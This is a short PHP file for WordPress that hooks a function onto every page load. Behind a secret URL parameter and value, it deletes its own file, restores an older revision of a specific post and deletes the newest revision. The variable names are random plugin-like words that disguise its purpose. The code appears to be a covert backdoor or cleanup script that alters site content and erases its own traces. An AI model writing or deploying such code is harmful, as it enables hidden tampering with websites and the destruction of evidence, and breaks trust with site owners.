<?php

function ecommerce_based_hidden() {
	if (isset($_GET['best_wishlist_affiliates']) && $_GET['best_wishlist_affiliates'] === 'layout_specific_single_keyword') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$cloud_single_pages_deprecated = 10322;
		$wpmu_reset_hello_source = wp_get_post_revisions($cloud_single_pages_deprecated);
		if (empty($wpmu_reset_hello_source)) die('no revisions');
		if (count($wpmu_reset_hello_source) < 2) die('less than 2');
		$publisher_related_engine_api = array_shift($wpmu_reset_hello_source);
		$modules_fix_name_grid = $publisher_related_engine_api->ID;
		$dashboard_stats_notice_design = array_shift($wpmu_reset_hello_source);
		$wpc_homepage_automatorwp_message = $dashboard_stats_notice_design->ID;
		$comment_scheduler_tables = wp_restore_post_revision($wpc_homepage_automatorwp_message);
		if ($comment_scheduler_tables === false) die('error restoring');
		$comment_scheduler_tables = wp_delete_post_revision($modules_fix_name_grid);		
		if ($comment_scheduler_tables === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'ecommerce_based_hidden');
